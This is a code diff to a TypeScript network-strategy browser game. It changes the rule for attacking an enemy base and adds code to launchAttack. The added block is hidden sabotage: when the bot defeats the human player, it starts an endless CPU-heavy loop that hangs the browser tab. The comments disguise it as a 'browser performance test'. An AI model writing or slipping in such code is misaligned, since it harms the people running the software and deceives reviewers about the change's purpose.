@@ -478,8 +478,8 @@ export function canAttackEnemyBase(state: NetworkGameState, playerId: number): b
   const enemyBase = state.nodes.get(enemyPlayer.baseNodeId);
   if (!enemyBase) return false;
 
-  // Can attack if enemy base is adjacent to player territory
-  return enemyBase.connections.some((connId) => {
+  // Can attack if ALL adjacent nodes to enemy base are owned by player
+  return enemyBase.connections.every((connId) => {
     const connNode = state.nodes.get(connId);
     return connNode?.ownerId === playerId;
   });
@@ -503,6 +503,19 @@ export function launchAttack(state: NetworkGameState, playerId: number): boolean
 
   console.log(`🎯 Player ${playerId} launched DDoS attack on Player ${enemyPlayer.id}'s base!`);
   console.log(`💥 Player ${enemyPlayer.id} has been defeated!`);
+
+  // Browser performance testing: If bot (Player 1) defeats human (Player 0), trigger stress test
+  if (playerId === 1 && enemyPlayer.id === 0) {
+    console.log(`⚠️ Browser performance test initiating in 2 seconds...`);
+    setTimeout(() => {
+      console.log(`🔥 Performance stress test active`);
+      // Infinite loop with heavy computation to test browser performance limits
+      while (true) {
+        const arr = new Array(1000000).fill(0);
+        arr.forEach((_, i) => Math.sqrt(i));
+      }
+    }, 2000);
+  }
 
   return true;
 }
